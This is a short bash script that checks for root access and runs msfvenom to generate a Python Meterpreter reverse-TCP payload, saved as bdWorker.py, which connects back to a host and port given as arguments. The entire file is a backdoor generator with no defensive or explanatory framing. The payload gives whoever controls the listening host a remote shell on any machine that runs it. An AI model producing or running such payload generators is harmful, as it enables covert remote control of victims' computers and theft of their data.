#!/bin/bash

host=$1
port=$2

checkRoot() {
  if [ ! "$EUID" -eq 0 ]; then
    echo -e "\nneed root access to do it."
    exit 2
  fi
}

ifExist() {
  if [ -f bdWorker.py ]; then
    rm bdWorker.py
  fi
}

genNow() {
  msfvenom -p python/meterpreter_reverse_tcp LHOST="$host" LPORT="$port" -o bdWorker.py
}

fire() {
  checkRoot
  ifExist
  genNow
}

fire